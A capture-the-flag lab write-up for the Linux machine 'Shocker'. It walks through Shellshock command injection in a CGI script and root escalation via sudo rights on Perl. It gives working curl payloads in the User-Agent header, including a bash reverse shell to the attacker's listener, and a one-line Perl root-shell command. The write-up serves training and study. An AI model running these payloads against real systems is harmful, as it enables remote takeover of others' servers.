# Shocker

**Difficulty:** Easy | **OS:** Linux | **IP:** `10.129.85.68`

## Summary
**Shocker** is an easy-difficulty Linux machine that demonstrates the severe risks of the classic Shellshock command injection vulnerability (CVE-2014-6271) within legacy CGI scripts and overly permissive `sudo` rights. Initial access is achieved by fuzzing for CGI directories (`/cgi-bin/`), discovering an executable shell script (`user.sh`), and injecting arbitrary system commands via crafted `User-Agent` HTTP headers. Privilege escalation to `root` is completed by leveraging unrestricted `sudo` execution rights on the Perl interpreter.

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating active TCP ports and identifying service versions:

- **80:** HTTP (Apache httpd 2.4.18)
- **2222:** SSH (OpenSSH 7.2p2 (Ubuntu 4ubuntu2.2)

### Web Directory & CGI Enumeration
1) Visiting the main web page hosted on port 80 displays a simple text banner (`Don't bug me!`) and an image, with no exposed links or administrative paths.
2) Performing directory fuzzing with extensions targeting Common Gateway Interface (CGI) scripts uncovers an active endpoint:

  - `/cgi-bin/user.sh`

3) Accessing the script via the browser returns a standard plain-text execution output (`Just an uptime test script`).

## Exploitation (Initial Access)

### Shellshock Vulnerability Verification (CVE-2014-6271)
The GNU Bourne Again Shell (`bash`) prior to September 2014 contains a vulnerability where environment variables containing trailing function definitions can cause the shell to execute arbitrary commands passed after the function declaration.

- **Vulnerability Mechanism:** When Apache executes a CGI script, environment variables such as HTTP headers (`User-Agent`, `Referer`) are exported directly to the shell environment. If the underlying shell is vulnerable bash, arbitrary code appended after a function definition in the `User-Agent` header executes immediately.

- **Verification via Nmap:**

  ```
  nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh -p 80 10.129.85.68
  ```

The script confirms the endpoint is vulnerable to Shellshock.

### Remote Code Execution & Reverse Shell
1) Testing command execution via `curl`:

  ```
  curl -s -X GET "http://10.129.85.68/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /usr/bin/whoami"
  ```

2) Deploying a reverse shell payload through the `User-Agent` header while listening on an active local port:

  ```
  curl -s -X GET "http://10.129.85.68/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /usr/bin/bash -i >& /dev/tcp/10.10.14.28/443 0>&1"
  ```

3) Catching the incoming connection establishes an interactive session under the service user account (`shelly`), allowing retrieval of `user.txt`.

## Privilege Escalation (Root Flag)

### Sudo Permission Enumeration
Checking assigned `sudo` execution rights for user `shelly` via `sudo -l` reveals an unrestricted privilege configuration:

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

### Perl Binary Exploitation
Because the user can execute the Perl interpreter with `root` privileges without providing a password, standard execution options can spawn an elevated shell.

- **Privilege Escalation Workflow:**
  Execute Perl with an inline execution flag calling the system shell:

  ```
  sudo perl -e 'exec "/bin/sh"'
  ```

The spawned shell inherits full administrative `root` privileges, allowing access to root.txt under `/root/root.txt`.
